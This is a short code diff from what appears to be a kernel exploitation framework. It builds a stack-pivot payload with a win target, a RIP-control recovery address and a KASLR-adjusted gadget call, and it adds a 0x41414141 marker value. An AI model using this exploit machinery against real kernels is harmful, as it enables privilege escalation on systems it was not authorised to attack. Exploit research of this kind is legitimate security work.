@@ -119,6 +119,7 @@ public:
         auto offs = pivot->GetDestinationOffset();
         p.Set(offs, kpwn.WinTarget());
         p.Set(offs + 8, kpwn.GetRipControlRecoveryAddr());
+        p.Set(offs + 16, 0xffffffff41414141);
 
         auto buf_addr = kpwn.AllocBuffer(p.GetData(), true);
         kpwn.CallAddr(kaslr + pivot->GetGadgetOffset(), { { buf_reg, buf_addr } });
